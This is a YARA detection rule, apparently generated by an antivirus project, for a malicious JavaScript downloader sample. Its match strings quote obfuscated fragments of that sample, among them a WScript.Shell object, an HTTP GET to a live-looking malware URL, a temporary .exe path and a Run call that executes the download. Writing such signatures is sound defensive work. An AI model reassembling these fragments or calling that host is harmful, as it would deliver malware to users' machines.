rule sig_20160328_f6176a08a8a4455d61b58b47a0f1943d {
  meta:
    description = "datamaliciousorder - file 20160328_f6176a08a8a4455d61b58b47a0f1943d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f4e58ea6a7f251eba7196ff9bfafeebd353d4bb1392525d0e1b30759f340e831"

  strings:
    $s1  = "function Fpatolua() {return Vdnii[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"dkxebOOSTs.exe\";};" fullword ascii
    $s2  = "Ooqxegv[Cpytwyjy](\"GET\", \"http://themesbin.com/k9sjaf\", false);" fullword ascii
    $s3  = "do {WScript[Ywhrwu](Bmjsnp() * 11)} while (Ooqxegv[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Vdnii = function Nswqxmf() {return WScript[Mvptq](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Eyujf(Muqvlgko, Ivuohr){return Muqvlgko - Ivuohr;};" fullword ascii
    $s6  = "function Dmogck(Lczeum){Vdnii[\"Run\"](Lczeum, Vbihmjwg, Vbihmjwg);};" fullword ascii
    $s7  = "function Nuhoeixfs() {return ((Itiotpcq == true) && (Itiotpcq == Oyblidjtyt)) ? 1 : Vbihmjwg;};" fullword ascii
    $s8  = "function Xneftuvgk(){return Ksmlhneuni;};" fullword ascii
    $s9  = "Itiotpcq = true; " fullword ascii
    $s10 = "function Zamdoyccb(){return Mvptq;};" fullword ascii
    $s11 = "function Tcivngc(Zjhzv) {var Bplsiomuy = (1, 2, 3, 4, 5, Zjhzv); return Bplsiomuy;};" fullword ascii
    $s12 = "var Qgpswnw = false;" fullword ascii
    $s13 = "var Iqndtceq = new this[\"Date\"]();" fullword ascii
    $s14 = "function Zpjvkpe()" fullword ascii
    $s15 = "var Itiotpcq = false;" fullword ascii
    $s16 = "Oyblidjtyt = true; " fullword ascii
    $s17 = "return Eyujf(Haavjjxgow, Dpxfsofsc);" fullword ascii
    $s18 = "function Bmjsnp(){return 22;};" fullword ascii
    $s19 = "var Oyblidjtyt = false;" fullword ascii
    $s20 = " while (Ljostqxb){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}